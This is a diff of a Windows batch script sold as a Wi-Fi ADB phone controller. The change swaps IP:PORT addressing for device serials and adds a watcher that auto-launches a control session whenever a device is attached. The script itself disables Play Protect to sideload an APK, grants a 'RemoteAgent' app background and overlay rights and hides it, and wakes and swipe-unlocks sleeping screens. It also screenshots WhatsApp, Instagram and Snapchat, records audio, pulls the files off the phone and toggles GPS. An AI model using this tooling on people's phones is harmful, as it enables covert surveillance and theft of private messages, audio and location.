@@ -78,8 +78,16 @@ if not exist "!ADB_PATH!\adb.exe" (
 :ADB_FOUND
 cd /d "!ADB_PATH!"
 
+if "%~1"=="--watcher" goto WATCHER_MODE
+if "%~1"=="--auto" (
+    set "DEVICE_ID=%~2"
+    goto MENU_START
+)
+
+
+
 :: -------------------------------------------------------------------------
-::  STAGE 1 — INITIALIZE
+::  AUTO_DETECT OR WAIT FOR DEVICE
 :: -------------------------------------------------------------------------
 :INITIALIZE
 cls
@@ -88,165 +96,85 @@ echo      LOCAL WI-FI ADB CONTROLLER  ^|  by Nani0p
 echo      github.com/Navdeep0p
 echo =======================================================
 echo.
-echo  Active Wireless Connections Already Cached:
-echo  -----------------------------------------------
-adb devices | findstr "555"
-echo  -----------------------------------------------
-echo.
-echo   [1]  Use a cached connection listed above
-echo   [2]  Connect a new device via USB cable
-echo.
-set /p INIT_CHOICE="Select (1 or 2): "
+echo  [*] Waiting for any device to be connected...
+adb wait-for-device
 
-if "!INIT_CHOICE!"=="1" goto USE_CACHED_DEVICE
-if "!INIT_CHOICE!"=="2" goto DEVICE_DISCOVERY
-echo  [!] Invalid selection.
-timeout /t 2 >nul
-goto INITIALIZE
+:: Extract the first attached device
+set "DEVICE_ID="
+for /f "tokens=1" %%a in ('adb devices ^| findstr /v "List" ^| findstr "device"') do (
+    if "!DEVICE_ID!"=="" set "DEVICE_ID=%%a"
+)
 
-:USE_CACHED_DEVICE
-echo.
-set "CACHED_ADDR="
-set /p CACHED_ADDR="  Enter IP:PORT from above (e.g., 192.168.1.10:5555): "
-if "!CACHED_ADDR!"=="" (
-    echo  [!] Cannot be empty.
+if "!DEVICE_ID!"=="" (
+    echo  [!] Failed to detect device. Retrying...
     timeout /t 2 >nul
     goto INITIALIZE
 )
-for /f "tokens=1,2 delims=:" %%a in ("!CACHED_ADDR!") do (
-    set "IP_ADDR=%%a"
-    set "PORT_TARGET=%%b"
-)
-if "!IP_ADDR!"=="" (
-    echo  [!] Invalid format. Use IP:PORT  e.g. 192.168.1.5:5555
-    timeout /t 2 >nul
-    goto INITIALIZE
-)
-echo  [*] Verifying connection to !IP_ADDR!:!PORT_TARGET!...
-adb connect !IP_ADDR!:!PORT_TARGET! >nul 2>&1
-adb devices | findstr "!IP_ADDR!" >nul
-if errorlevel 1 (
-    echo  [!] Could not reach !IP_ADDR!:!PORT_TARGET!
-    echo  [i] Make sure the device is on the same Wi-Fi network.
-    pause
-    goto INITIALIZE
-)
-echo  [+] Connected to !IP_ADDR!:!PORT_TARGET!
+
+echo  [+] Auto-selected device: !DEVICE_ID!
 timeout /t 2 >nul
 goto MENU_START
 
 :: -------------------------------------------------------------------------
-::  STAGE 2 — DEVICE DISCOVERY: Detect USB device and assign port
+::  WATCHER MODE (Runs in background)
 :: -------------------------------------------------------------------------
-:DEVICE_DISCOVERY
+:WATCHER_MODE
+set "PREV_DEVICES="
+:WATCHER_LOOP
+set "CURR_DEVICES="
+for /f "tokens=1" %%a in ('adb devices ^| findstr /v "List" ^| findstr "device"') do (
+    set "CURR_DEVICES=!CURR_DEVICES! %%a"
+)
+:: Compare
+for %%D in (!CURR_DEVICES!) do (
+    echo !PREV_DEVICES! | findstr /c:"%%D" >nul
+    if errorlevel 1 (
+        :: New device found!
+        start "" cmd /c "%~f0" --auto %%D
+    )
+)
+set "PREV_DEVICES=!CURR_DEVICES!"
+timeout /t 2 >nul
+goto WATCHER_LOOP
+
+:: -------------------------------------------------------------------------
+::  DEVICE SELECTION (When selecting another device)
+:: -------------------------------------------------------------------------
+:SELECT_DEVICE
 cls
 echo =======================================================
-echo           SCANNING HARDWARE INTERFACES
-echo           by Nani0p ^| github.com/Navdeep0p
+echo            SELECT CONNECTED DEVICE
 echo =======================================================
 echo.
-echo  USB Devices Currently Attached:
-echo  -----------------------------------------------
-adb devices | findstr /v "List" | findstr /v "555" | findstr "device"
-echo  -----------------------------------------------
-echo.
-set /p TARGET_SERIAL="Enter or Paste the USB Device Serial Number: "
-
-if "%TARGET_SERIAL%"=="" (
-    echo  [!] Serial number cannot be empty.
-    timeout /t 2 >nul
-    goto DEVICE_DISCOVERY
+set idx=0
+for /f "tokens=1" %%a in ('adb devices ^| findstr /v "List" ^| findstr "device"') do (
+    set /a idx+=1
+    set "DEV_!idx!=%%a"
+    echo   [!idx!] %%a
 )
 
-:: ---- AUTO PORT SELECTION ----
-:: Loop from 5555 upward until we find a port not already in use by adb
-set PORT_TARGET=5554
-:PORT_SCAN
-set /a PORT_TARGET+=1
-if %PORT_TARGET% GTR 5570 (
-    echo  [!] All ports 5555-5570 appear occupied. Disconnecting stale sessions...
-    adb disconnect >nul 2>&1
-    set PORT_TARGET=5555
-    goto PORT_DONE
-)
-adb devices | findstr ":%PORT_TARGET%" >nul 2>&1
-if not errorlevel 1 goto PORT_SCAN
-:PORT_DONE
-
-echo.
-echo  [*] Assigning unique port: %PORT_TARGET%
-echo  [*] Switching device to TCP/IP mode...
-adb -s %TARGET_SERIAL% tcpip %PORT_TARGET%
-
-:: ---- WAIT FOR DEVICE TO RE-STABILIZE ----
-:: NOTE: After 'adb tcpip', the USB serial becomes permanently invalid on most
-:: Android devices. A plain errorlevel loop hangs forever. We cap at 15 tries.
-echo  [*] Waiting for device to re-stabilize on TCP/IP...
-set WAIT_COUNT=0
-:WAIT_LOOP
-timeout /t 1 >nul
-set /a WAIT_COUNT+=1
-if %WAIT_COUNT% GEQ 15 (
-    echo  [*] Timeout reached - device should be ready. Continuing...
-    goto WAIT_DONE
-)
-adb -s %TARGET_SERIAL% shell "echo checking" >nul 2>&1
-if errorlevel 1 goto WAIT_LOOP
-:WAIT_DONE
-
-echo  [*] Device responsive. Extracting Wi-Fi IP address...
-
-:: ---- IP EXTRACTION ----
-set RAW_IP=
-set CLEAN_IP=
-set IP_ADDR=
-
-:: Method 1: DHCP properties (most Android versions)
-for /f "tokens=*" %%a in ('adb -s %TARGET_SERIAL% shell "getprop dhcp.wlan0.ipaddress"') do set "RAW_IP=%%a"
-
-:: Method 2: Live interface state (Android 10+ fallback)
-if "%RAW_IP%"=="" (
-    for /f "tokens=2" %%a in ('adb -s %TARGET_SERIAL% shell "ip -4 addr show wlan0" ^| findstr "inet "') do set "RAW_IP=%%a"
-)
-
-:: Strip subnet mask (e.g. 192.168.1.5/24 -> 192.168.1.5)
-for /f "tokens=1 delims=/" %%a in ("%RAW_IP%") do set "CLEAN_IP=%%a"
-
-:: Strip invisible Android carriage return (\r)
-for /f "tokens=1" %%a in ("%CLEAN_IP%") do set "IP_ADDR=%%a"
-
-:: Sanity check
-if not "%IP_ADDR%"=="" (
-    echo %IP_ADDR% | findstr /r /c:"[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*" >nul
-    if errorlevel 1 set IP_ADDR=
-)
-
-if "%IP_ADDR%"=="" (
-    echo  [!] Could not parse IP automatically.
-    echo.
-    set /p IP_ADDR="     Manually enter the device Wi-Fi IP address: "
-) else (
-    echo  [*] Device IP found: %IP_ADDR%
-)
-
-echo.
-echo  [*] You can safely unplug the USB cable now.
-echo.
-pause
-
-echo  [*] Connecting wirelessly to %IP_ADDR%:%PORT_TARGET%...
-adb connect %IP_ADDR%:%PORT_TARGET%
-
-:: Confirm wireless connection succeeded
-adb devices | findstr "%IP_ADDR%" >nul
-if errorlevel 1 (
-    echo.
-    echo  [!] WARNING: Wireless connection may have failed.
-    echo  [!] Ensure both devices are on the same Wi-Fi network.
-    echo.
+if !idx!==0 (
+    echo  [!] No devices connected.
     pause
+    goto INITIALIZE
 )
+
+echo.
+echo   [b] Back to Main Menu
+echo.
+set /p SEL_CHOICE="Select device number: "
+if /i "!SEL_CHOICE!"=="b" goto MENU_START
+
+set "DEVICE_ID=!DEV_%SEL_CHOICE%!"
+if "!DEVICE_ID!"=="" (
+    echo  [!] Invalid selection.
+    timeout /t 2 >nul
+    goto SELECT_DEVICE
+)
+
+echo  [+] Switched to device: !DEVICE_ID!
 timeout /t 2 >nul
+goto MENU_START
 
 :: =========================================================================
 ::  MAIN MENU
@@ -254,7 +182,7 @@ timeout /t 2 >nul
 :MENU_START
 cls
 echo =======================================================
-echo   ACTIVE NODE: %IP_ADDR%:%PORT_TARGET% ^| DASHBOARD
+echo   ACTIVE NODE: %DEVICE_ID% ^| DASHBOARD
 echo   by Nani0p ^| github.com/Navdeep0p
 echo =======================================================
 echo.
@@ -277,7 +205,7 @@ if "%CHOICE%"=="3" goto INSTALL_APK
 if "%CHOICE%"=="4" goto SS_ENGINE_STANDALONE
 if "%CHOICE%"=="5" goto INJECT_SHIZUKU
 if "%CHOICE%"=="6" goto MODULE_PHONE_ACTIONS
-if "%CHOICE%"=="7" goto INITIALIZE
+if "%CHOICE%"=="7" goto SELECT_DEVICE
 if "%CHOICE%"=="8" goto EXIT_SCRIPT
 
 echo  [!] Invalid selection.
@@ -291,7 +219,7 @@ goto MENU_START
 cls
 echo =======================================================
 echo      PROJECT 1: WIRELESS CONTROL TERMINAL
-echo      Controlling: %IP_ADDR%:%PORT_TARGET%
+echo      Controlling: %DEVICE_ID%
 echo =======================================================
 echo.
 echo   [1]  Wake Up Screen               [6]  Press BACK Button
@@ -303,19 +231,19 @@ echo.
 set /p P1_CHOICE="Select option (1-9): "
 
 if "%P1_CHOICE%"=="1" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 224
+    adb -s %DEVICE_ID% shell input keyevent 224
     echo  [*] Wake Up signal sent.
     timeout /t 2 >nul
     goto PROJECT_1
 )
 if "%P1_CHOICE%"=="2" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26
+    adb -s %DEVICE_ID% shell input keyevent 26
     echo  [*] Power/Screen toggle sent.
     timeout /t 2 >nul
     goto PROJECT_1
 )
 if "%P1_CHOICE%"=="3" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 66
+    adb -s %DEVICE_ID% shell input keyevent 66
     echo  [*] ENTER key sent.
     timeout /t 2 >nul
     goto PROJECT_1
@@ -323,19 +251,19 @@ if "%P1_CHOICE%"=="3" (
 if "%P1_CHOICE%"=="4" (
     echo.
     set /p TEXT_INPUT="  Enter text to inject: "
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input text "!TEXT_INPUT!"
+    adb -s %DEVICE_ID% shell input text "!TEXT_INPUT!"
     echo  [*] Text injected successfully.
     timeout /t 3 >nul
     goto PROJECT_1
 )
 if "%P1_CHOICE%"=="5" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 3
+    adb -s %DEVICE_ID% shell input keyevent 3
     echo  [*] HOME button sent.
     timeout /t 2 >nul
     goto PROJECT_1
 )
 if "%P1_CHOICE%"=="6" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 4
+    adb -s %DEVICE_ID% shell input keyevent 4
     echo  [*] BACK button sent.
     timeout /t 2 >nul
     goto PROJECT_1
@@ -343,7 +271,7 @@ if "%P1_CHOICE%"=="6" (
 if "%P1_CHOICE%"=="7" (
     echo.
     set /p TARGET_URL="  Enter URL (e.g., https://google.com): "
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.intent.action.VIEW -d "!TARGET_URL!"
+    adb -s %DEVICE_ID% shell am start -a android.intent.action.VIEW -d "!TARGET_URL!"
     echo  [*] Browser intent sent.
     timeout /t 3 >nul
     goto PROJECT_1
@@ -362,7 +290,7 @@ goto PROJECT_1
 cls
 echo =======================================================
 echo          PROJECT 2: WIRELESS SCRCPY ENGINE
-echo          Streaming: %IP_ADDR%:%PORT_TARGET%
+echo          Streaming: %DEVICE_ID%
 echo =======================================================
 echo.
 echo   [1]  Standard Mirror
@@ -374,17 +302,17 @@ set /p P2_CHOICE="Select profile (1-4): "
 
 if "%P2_CHOICE%"=="1" (
     echo  [*] Starting standard mirror...
-    scrcpy.exe -s %IP_ADDR%:%PORT_TARGET%
+    scrcpy.exe -s %DEVICE_ID%
     goto PROJECT_2
 )
 if "%P2_CHOICE%"=="2" (
     echo  [*] Starting high-performance mirror...
-    scrcpy.exe -s %IP_ADDR%:%PORT_TARGET% -b 8M -m 1920 --max-fps 60 --video-codec=h264
+    scrcpy.exe -s %DEVICE_ID% -b 8M -m 1920 --max-fps 60 --video-codec=h264
     goto PROJECT_2
 )
 if "%P2_CHOICE%"=="3" (
     echo  [*] Starting screen-only mirror...
-    scrcpy.exe -s %IP_ADDR%:%PORT_TARGET% --no-audio
+    scrcpy.exe -s %DEVICE_ID% --no-audio
     goto PROJECT_2
 )
 if "%P2_CHOICE%"=="4" goto MENU_START
@@ -409,25 +337,25 @@ set /p APK_PATH="  APK Path: "
 echo.
 
 echo  [*] Temporarily disabling Play Protect scanner...
-adb -s %IP_ADDR%:%PORT_TARGET% shell settings put global package_verifier_enable 0 >nul 2>&1
-adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure miui_package_verifier_enable 0 >nul 2>&1
+adb -s %DEVICE_ID% shell settings put global package_verifier_enable 0 >nul 2>&1
+adb -s %DEVICE_ID% shell settings put secure miui_package_verifier_enable 0 >nul 2>&1
 timeout /t 3 >nul
 
 echo  [*] Installing APK...
-adb -s %IP_ADDR%:%PORT_TARGET% install -r %APK_PATH%
+adb -s %DEVICE_ID% install -r %APK_PATH%
 if errorlevel 1 (
     echo.
     echo  [!] Installation FAILED. Check the path and try again.
     echo  [*] Restoring Play Protect...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put global package_verifier_enable 1 >nul 2>&1
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure miui_package_verifier_enable 1 >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put global package_verifier_enable 1 >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put secure miui_package_verifier_enable 1 >nul 2>&1
     pause
     goto MENU_START
 )
 
 echo  [*] Restoring Play Protect scanner...
-adb -s %IP_ADDR%:%PORT_TARGET% shell settings put global package_verifier_enable 1 >nul 2>&1
-adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure miui_package_verifier_enable 1 >nul 2>&1
+adb -s %DEVICE_ID% shell settings put global package_verifier_enable 1 >nul 2>&1
+adb -s %DEVICE_ID% shell settings put secure miui_package_verifier_enable 1 >nul 2>&1
 
 echo.
 echo  [+] APK installed successfully!
@@ -438,17 +366,17 @@ if /I not "%GOD_MODE%"=="y" goto SKIP_PERMS
 echo.
 set /p INJECT_PKG="  Enter exact package name (e.g., com.nani0p.RemoteAgent): "
 echo  [*] Injecting system-level permissions for %INJECT_PKG%...
-adb -s %IP_ADDR%:%PORT_TARGET% shell dumpsys deviceidle whitelist +%INJECT_PKG% >nul 2>&1
-adb -s %IP_ADDR%:%PORT_TARGET% shell appops set %INJECT_PKG% SYSTEM_ALERT_WINDOW allow >nul 2>&1
-adb -s %IP_ADDR%:%PORT_TARGET% shell appops set %INJECT_PKG% RUN_IN_BACKGROUND allow >nul 2>&1
-adb -s %IP_ADDR%:%PORT_TARGET% shell appops set %INJECT_PKG% RUN_ANY_IN_BACKGROUND allow >nul 2>&1
+adb -s %DEVICE_ID% shell dumpsys deviceidle whitelist +%INJECT_PKG% >nul 2>&1
+adb -s %DEVICE_ID% shell appops set %INJECT_PKG% SYSTEM_ALERT_WINDOW allow >nul 2>&1
+adb -s %DEVICE_ID% shell appops set %INJECT_PKG% RUN_IN_BACKGROUND allow >nul 2>&1
+adb -s %DEVICE_ID% shell appops set %INJECT_PKG% RUN_ANY_IN_BACKGROUND allow >nul 2>&1
 
 echo  [*] Waking app from stopped state...
-adb -s %IP_ADDR%:%PORT_TARGET% shell monkey -p %INJECT_PKG% 1 >nul 2>&1
+adb -s %DEVICE_ID% shell monkey -p %INJECT_PKG% 1 >nul 2>&1
 timeout /t 4 >nul
 
 echo  [*] Minimizing app to background...
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 3
+adb -s %DEVICE_ID% shell input keyevent 3
 echo.
 echo  [+] COMPLETE: Agent is armed, authorized, and hidden.
 
@@ -476,9 +404,9 @@ echo.
 
 for /L %%I in (1, 1, %SS_COUNT%) do (
     echo  [Shot %%I of %SS_COUNT%] Capturing...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell screencap -p /sdcard/tmp_shot_%%I.png
-    adb -s %IP_ADDR%:%PORT_TARGET% pull /sdcard/tmp_shot_%%I.png "Screenshots\Capture_%%I.png" >nul
-    adb -s %IP_ADDR%:%PORT_TARGET% shell rm /sdcard/tmp_shot_%%I.png
+    adb -s %DEVICE_ID% shell screencap -p /sdcard/tmp_shot_%%I.png
+    adb -s %DEVICE_ID% pull /sdcard/tmp_shot_%%I.png "Screenshots\Capture_%%I.png" >nul
+    adb -s %DEVICE_ID% shell rm /sdcard/tmp_shot_%%I.png
     timeout /t %SS_INTERVAL% >nul
 )
 echo.
@@ -504,7 +432,7 @@ if errorlevel 1 (
 )
 
 echo  [*] Installing Shizuku on device...
-adb -s %IP_ADDR%:%PORT_TARGET% install -r shizuku_latest.apk
+adb -s %DEVICE_ID% install -r shizuku_latest.apk
 if errorlevel 1 (
     echo  [!] Shizuku installation failed.
     del shizuku_latest.apk >nul 2>&1
@@ -513,7 +441,7 @@ if errorlevel 1 (
 )
 
 echo  [*] Starting Shizuku background daemon...
-adb -s %IP_ADDR%:%PORT_TARGET% shell sh /sdcard/Android/data/moe.shizuku.privileged.api/start.sh
+adb -s %DEVICE_ID% shell sh /sdcard/Android/data/moe.shizuku.privileged.api/start.sh
 
 echo.
 echo  [+] Shizuku installed and running!
@@ -574,42 +502,42 @@ goto SKIP_CAM_PREP
 :DO_CAM_PREP
 echo  [*] Granting camera permissions...
 for %%P in (com.android.camera com.android.camera2 com.miui.camera com.sec.android.app.camera org.codeaurora.snapcam com.oneplus.camera) do (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell pm grant %%P android.permission.CAMERA >nul 2>&1
-    adb -s %IP_ADDR%:%PORT_TARGET% shell appops set %%P CAMERA allow >nul 2>&1
+    adb -s %DEVICE_ID% shell pm grant %%P android.permission.CAMERA >nul 2>&1
+    adb -s %DEVICE_ID% shell appops set %%P CAMERA allow >nul 2>&1
 )
 set "SCREEN_WAS_OFF_L=0"
-for /f "tokens=*" %%a in ('adb -s %IP_ADDR%:%PORT_TARGET% shell "dumpsys power | grep mWakefulness=" 2^>nul') do set "WAKE_RAW_L=%%a"
+for /f "tokens=*" %%a in ('adb -s %DEVICE_ID% shell "dumpsys power | grep mWakefulness=" 2^>nul') do set "WAKE_RAW_L=%%a"
 echo !WAKE_RAW_L! | findstr /i "Asleep Dozing" >nul 2>&1
 if not errorlevel 1 (
     set "SCREEN_WAS_OFF_L=1"
     echo  [*] Waking screen...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26
+    adb -s %DEVICE_ID% shell input keyevent 26
     timeout /t 2 >nul
-    adb connect %IP_ADDR%:%PORT_TARGET% >nul 2>&1
+    adb connect %DEVICE_ID% >nul 2>&1
     timeout /t 2 >nul
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input swipe 540 1600 540 800 300 >nul 2>&1
+    adb -s %DEVICE_ID% shell input swipe 540 1600 540 800 300 >nul 2>&1
     timeout /t 1 >nul
 )
 :SKIP_CAM_PREP
 
 if "%APP_PKG%"=="SETTINGS" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.settings.SETTINGS >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -a android.settings.SETTINGS >nul 2>&1
 ) else if "%APP_PKG%"=="CAMERA_REAR" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.media.action.STILL_IMAGE_CAMERA >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -a android.media.action.STILL_IMAGE_CAMERA >nul 2>&1
 ) else if "%APP_PKG%"=="CAMERA_FRONT" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 1 >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -a android.media.action.STILL_IMAGE_CAMERA --ei android.intent.extras.CAMERA_FACING 1 >nul 2>&1
 ) else if "%APP_PKG%"=="com.whatsapp" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -n com.whatsapp/com.whatsapp.Main >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -n com.whatsapp/com.whatsapp.Main >nul 2>&1
 ) else if "%APP_PKG%"=="com.instagram.android" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -n com.instagram.android/com.instagram.mainactivity.MainActivity >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -n com.instagram.android/com.instagram.mainactivity.MainActivity >nul 2>&1
 ) else if "%APP_PKG%"=="com.snapchat.android" (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -n com.snapchat.android/com.snap.mushroom.MainActivity >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -n com.snapchat.android/com.snap.mushroom.MainActivity >nul 2>&1
 ) else (
-    adb -s %IP_ADDR%:%PORT_TARGET% shell monkey -p %APP_PKG% 1 >nul 2>&1
+    adb -s %DEVICE_ID% shell monkey -p %APP_PKG% 1 >nul 2>&1
 )
 
 echo  [*] Opening live scrcpy mirror in background...
-start "" scrcpy.exe -s %IP_ADDR%:%PORT_TARGET% -b 8M -m 1920 --max-fps 60 --video-codec=h264
+start "" scrcpy.exe -s %DEVICE_ID% -b 8M -m 1920 --max-fps 60 --video-codec=h264
 echo.
 set /p IN_APP_SS="  Start continuous background screenshots? (y/n): "
 if /I "%IN_APP_SS%"=="y" goto SS_ENGINE_IN_APP
@@ -632,9 +560,9 @@ if errorlevel 1 (
     goto APP_LAUNCHER
 )
 echo  [Shot %SS_NUM% - %APP_NAME%] Capturing...
-adb -s %IP_ADDR%:%PORT_TARGET% shell screencap -p /sdcard/tmp_shot.png
-adb -s %IP_ADDR%:%PORT_TARGET% pull /sdcard/tmp_shot.png "Screenshots\%APP_NAME%_%SS_NUM%.png" >nul
-adb -s %IP_ADDR%:%PORT_TARGET% shell rm /sdcard/tmp_shot.png
+adb -s %DEVICE_ID% shell screencap -p /sdcard/tmp_shot.png
+adb -s %DEVICE_ID% pull /sdcard/tmp_shot.png "Screenshots\%APP_NAME%_%SS_NUM%.png" >nul
+adb -s %DEVICE_ID% shell rm /sdcard/tmp_shot.png
 set /a SS_NUM+=1
 timeout /t 2 >nul
 goto SS_LOOP
@@ -646,7 +574,7 @@ goto SS_LOOP
 cls
 echo =======================================================
 echo      MODULE 6: PHONE ACTIONS ^& SENSORS
-echo      Device: %IP_ADDR%:%PORT_TARGET%
+echo      Device: %DEVICE_ID%
 echo      by Nani0p ^| github.com/Navdeep0p
 echo =======================================================
 echo.
@@ -697,20 +625,20 @@ echo.
 echo  [*] Reading current Location mode...
 set "GPS_MODE=0"
 set "GPS_RAW="
-for /f "tokens=*" %%a in ('adb -s %IP_ADDR%:%PORT_TARGET% shell settings get secure location_mode 2^>nul') do set "GPS_RAW=%%a"
+for /f "tokens=*" %%a in ('adb -s %DEVICE_ID% shell settings get secure location_mode 2^>nul') do set "GPS_RAW=%%a"
 for /f "tokens=1" %%a in ("!GPS_RAW!") do set "GPS_MODE=%%a"
 echo  [*] Current mode value: !GPS_MODE!
 if "!GPS_MODE!"=="0" (
     echo  [*] GPS is OFF -^> Turning ON (High Accuracy)...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure location_mode 3 >nul 2>&1
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure location_providers_allowed +gps >nul 2>&1
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure location_providers_allowed +network >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put secure location_mode 3 >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put secure location_providers_allowed +gps >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put secure location_providers_allowed +network >nul 2>&1
     echo  [+] GPS turned ON successfully.
 ) else (
     echo  [*] GPS is ON (Mode: !GPS_MODE!) -^> Turning OFF...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure location_mode 0 >nul 2>&1
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure location_providers_allowed -gps >nul 2>&1
-    adb -s %IP_ADDR%:%PORT_TARGET% shell settings put secure location_providers_allowed -network >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put secure location_mode 0 >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put secure location_providers_allowed -gps >nul 2>&1
+    adb -s %DEVICE_ID% shell settings put secure location_providers_allowed -network >nul 2>&1
     echo  [+] GPS turned OFF successfully.
 )
 echo.
@@ -723,7 +651,7 @@ goto MODULE_PHONE_ACTIONS
 :PA_GPS_SETTINGS
 echo.
 echo  [*] Opening Location Settings on device...
-adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.settings.LOCATION_SOURCE_SETTINGS >nul 2>&1
+adb -s %DEVICE_ID% shell am start -a android.settings.LOCATION_SOURCE_SETTINGS >nul 2>&1
 if errorlevel 1 (
     echo  [!] Could not launch Location Settings. Check device connection.
     pause
@@ -751,11 +679,11 @@ if "!NAV_DEST!"=="" (
 echo !NAV_DEST! | findstr /i "http" >nul
 if not errorlevel 1 (
     echo  [*] Detected URL -^> launching directly in Maps...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.intent.action.VIEW -d "!NAV_DEST!" >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -a android.intent.action.VIEW -d "!NAV_DEST!" >nul 2>&1
 ) else (
     set "NAV_ENCODED=!NAV_DEST: =+!"
     echo  [*] Launching navigation to: !NAV_DEST!
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.intent.action.VIEW -d "google.navigation:q=!NAV_ENCODED!" >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -a android.intent.action.VIEW -d "google.navigation:q=!NAV_ENCODED!" >nul 2>&1
 )
 echo  [+] Google Maps Navigation launched on device.
 timeout /t 3 >nul
@@ -775,10 +703,10 @@ if "!CALL_NUM!"=="" (
     goto MODULE_PHONE_ACTIONS
 )
 echo  [*] Initiating call to !CALL_NUM!...
-adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.intent.action.CALL -d "tel:!CALL_NUM!"
+adb -s %DEVICE_ID% shell am start -a android.intent.action.CALL -d "tel:!CALL_NUM!"
 if errorlevel 1 (
     echo  [!] Direct CALL intent failed. Opening Dialer instead...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.intent.action.DIAL -d "tel:!CALL_NUM!" >nul 2>&1
+    adb -s %DEVICE_ID% shell am start -a android.intent.action.DIAL -d "tel:!CALL_NUM!" >nul 2>&1
     echo  [i] Dialer opened with number pre-filled. Press call on device.
 ) else (
     echo  [+] Call initiated successfully on device.
@@ -795,20 +723,20 @@ if "!REC_SECS!"=="" set "REC_SECS=10"
 if not exist "Recordings" mkdir "Recordings"
 echo.
 echo  [*] Opening Voice Recorder on device...
-adb -s %IP_ADDR%:%PORT_TARGET% shell am start -a android.provider.MediaStore.RECORD_SOUND >nul 2>&1
+adb -s %DEVICE_ID% shell am start -a android.provider.MediaStore.RECORD_SOUND >nul 2>&1
 timeout /t 2 >nul
 echo  [*] Recording for !REC_SECS! seconds...
 timeout /t !REC_SECS! >nul
 echo  [*] Stopping recording (sending Back key)...
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 4
+adb -s %DEVICE_ID% shell input keyevent 4
 timeout /t 3 >nul
 echo  [*] Searching for newest audio file on device...
 set "REC_FILE="
-for /f "tokens=*" %%a in ('adb -s %IP_ADDR%:%PORT_TARGET% shell "find /sdcard -maxdepth 4 \( -name '*.m4a' -o -name '*.3gp' -o -name '*.aac' -o -name '*.mp3' -o -name '*.wav' \) 2>/dev/null | xargs ls -t 2>/dev/null | head -1"') do set "REC_FILE=%%a"
+for /f "tokens=*" %%a in ('adb -s %DEVICE_ID% shell "find /sdcard -maxdepth 4 \( -name '*.m4a' -o -name '*.3gp' -o -name '*.aac' -o -name '*.mp3' -o -name '*.wav' \) 2>/dev/null | xargs ls -t 2>/dev/null | head -1"') do set "REC_FILE=%%a"
 for /f "tokens=1" %%a in ("!REC_FILE!") do set "REC_FILE=%%a"
 if not "!REC_FILE!"=="" (
     echo  [*] Found: !REC_FILE!
-    adb -s %IP_ADDR%:%PORT_TARGET% pull "!REC_FILE!" "Recordings\"
+    adb -s %DEVICE_ID% pull "!REC_FILE!" "Recordings\"
     echo  [+] Recording saved to: %CD%\Recordings\
 ) else (
     echo  [!] Could not locate audio file automatically.
@@ -824,17 +752,17 @@ if not exist "Photos" mkdir "Photos"
 
 :: -- Check if screen is currently off --
 set "SCREEN_WAS_OFF=0"
-for /f "tokens=*" %%a in ('adb -s %IP_ADDR%:%PORT_TARGET% shell "dumpsys power | grep mWakefulness=" 2^>nul') do set "WAKE_RAW=%%a"
+for /f "tokens=*" %%a in ('adb -s %DEVICE_ID% shell "dumpsys power | grep mWakefulness=" 2^>nul') do set "WAKE_RAW=%%a"
 echo !WAKE_RAW! | findstr /i "Asleep Dozing" >nul 2>&1
 if not errorlevel 1 set "SCREEN_WAS_OFF=1"
 
 if "!SCREEN_WAS_OFF!"=="1" (
     echo  [*] Screen is off — waking...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26
+    adb -s %DEVICE_ID% shell input keyevent 26
     timeout /t 2 >nul
-    adb connect %IP_ADDR%:%PORT_TARGET% >nul 2>&1
+    adb connect %DEVICE_ID% >nul 2>&1
     timeout /t 2 >nul
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input swipe 540 1600 540 800 300 >nul 2>&1
